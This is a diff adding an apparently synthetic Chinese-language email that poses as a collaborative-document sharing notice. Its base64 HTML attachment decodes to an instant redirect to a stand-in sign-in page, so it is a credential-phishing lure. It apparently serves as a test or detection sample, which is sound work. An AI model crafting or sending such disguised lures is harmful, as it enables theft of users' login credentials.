@@ -1,0 +1,19 @@
+From: =?utf-8?B?5paH5qGj5pyN5Yqh?= <docs@colab-notice.example>
+To: pmo@corp.internal
+Date: Tue, 25 Aug 2026 10:24:00 +0800
+Message-ID: <0004-b2@synth.example>
+Subject: 协作文档分享：验收口径
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+同事分享了一篇文档给你，打开即可评论。
+--BS
+Content-Type: text/html
+Content-Disposition: attachment; filename="验收口径.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDt1cmw9aHR0cHM6Ly9jb2xhYi1kb2MuZXhhbXBsZS5vcmcvc2lnbmluJz48L2hlYWQ+PGJvZHk+6Lez6L2s6K+E6K666aG14oCmPC9ib2R5PjwvaHRtbD4=
+--BS--
